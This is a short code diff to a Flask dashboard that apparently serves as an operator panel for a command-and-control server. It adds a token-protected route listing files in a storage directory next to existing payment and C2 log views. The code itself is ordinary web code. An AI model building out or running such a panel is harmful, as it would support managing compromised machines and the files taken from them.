@@ -5,7 +5,7 @@ from datetime import datetime, timezone
 import json
 import os
 from Extensions import limiter, check_token, check_token_log
-from C2_Variables import DB_PATH, seconds_left, dashboard_log_json, c2_log_json, jwt_key_dashboard
+from C2_Variables import DB_PATH, FILE_STORAGE_DIR, seconds_left, dashboard_log_json, c2_log_json, jwt_key_dashboard
 
 dashboard_bp = Blueprint('dashboard', __name__)
 
@@ -114,5 +114,20 @@ def dashboard_log_payments():
     web_page = 'Dashboard_Payments.html'
     log_data = payments
     return check_token_log(token, web_page, log_data)
+
+####################################################################################################################
+
+@dashboard_bp.route('/dashboard/files')
+def dashboard_files():
+    try:
+        files = os.listdir(FILE_STORAGE_DIR)
+        files = [f for f in files if os.path.isfile(os.path.join(FILE_STORAGE_DIR, f))]
+    except Exception as e:
+        files = [f"Error: {e}"]
+
+    token = request.cookies.get('token')
+    web_page = 'Dashboard_Files.html'
+    files_data = files
+    return check_token_log(token, web_page, files_data)
 
 ####################################################################################################################
